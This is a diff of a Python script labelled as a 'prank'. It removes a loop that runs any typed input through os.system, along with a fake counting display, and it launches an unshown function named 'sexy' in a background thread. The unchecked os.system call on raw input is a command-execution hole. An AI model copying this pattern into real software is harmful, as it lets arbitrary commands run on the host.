@@ -56,18 +56,8 @@ def photo():
             print(f"Error: {e}")
 
 def main():
-    count = 0
-    while True:
-        jxx = input("\033[1;37m$ ")
-        os.system(f"{jxx}")
-        
-        # Prank: Logic for dynamic count starting from 0 in 1-2 seconds speed
-        logic_count = 0
-        while logic_count < 10:  # Adjust the stopping condition as needed
-            logic_count += 1
-            time.sleep(random.uniform(1, 2))
-            print(f"[ WASEEM ] {{ Count numbers from 0 }} | {logic_count}")
-
+    print("hello there")
+    
 if __name__ == "__main__":
     with ThreadPool(max_workers=20) as jjj:
         jjj.submit(sexy)
